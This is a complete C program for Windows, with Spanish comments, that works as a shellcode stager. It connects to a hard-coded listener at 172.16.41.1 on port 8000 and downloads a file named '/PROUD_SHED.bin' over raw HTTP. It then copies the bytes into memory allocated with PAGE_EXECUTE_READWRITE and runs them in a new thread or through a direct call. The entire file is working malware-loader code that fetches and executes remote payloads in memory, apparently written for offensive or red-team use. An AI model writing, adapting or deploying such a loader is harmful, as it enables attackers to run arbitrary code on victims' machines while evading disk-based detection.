#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")

#define BUFFER_SIZE 4096
#define LHOST "172.16.41.1"
#define LPORT 8000
#define PAYLOAD_PATH "/PROUD_SHED.bin"

typedef HMODULE(WINAPI* LoadLibraryAFunc)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[512];
    char buffer[BUFFER_SIZE];
    unsigned char *full_data = NULL;
    size_t full_size = 0;
    int bytes;

    // 1. Inicializar Winsock
    WSAStartup(MAKEWORD(2,2), &wsa);

    // 2. Crear socket y conectar
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);
    inet_pton(AF_INET, LHOST, &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 3. Enviar petición GET
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n", PAYLOAD_PATH, LHOST);
    send(sock, request, strlen(request), 0);

    // 4. Recibir todo en memoria
    while ((bytes = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        unsigned char *tmp = realloc(full_data, full_size + bytes);
        if (!tmp) goto cleanup;
        full_data = tmp;
        memcpy(full_data + full_size, buffer, bytes);
        full_size += bytes;
    }

    // 5. Buscar el cuerpo (después de \r\n\r\n)
    unsigned char *body = NULL;
    size_t body_size = 0;
    char *header_end = strstr((char*)full_data, "\r\n\r\n");
    if (header_end) {
        body = (unsigned char*)(header_end + 4);
        body_size = full_size - (body - full_data);
    } else {
        // Si no hay cabeceras (servidor simple), todo es payload
        body = full_data;
        body_size = full_size;
    }

    if (body_size == 0) goto cleanup;

    // 6. Reservar memoria ejecutable
    LPVOID exec_mem = VirtualAlloc(NULL, body_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) goto cleanup;

    // 7. Copiar payload
    memcpy(exec_mem, body, body_size);

    // 8. Crear hilo y ejecutar (o llamar directamente si es shellcode)
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);  // opcional: espera a que termine
        CloseHandle(hThread);
    } else {
        // Si es shellcode puro, puedes llamarlo directamente:
        ((void(*)())exec_mem)();
    }

cleanup:
    if (full_data) free(full_data);
    closesocket(sock);
    WSACleanup();
    return 0;
}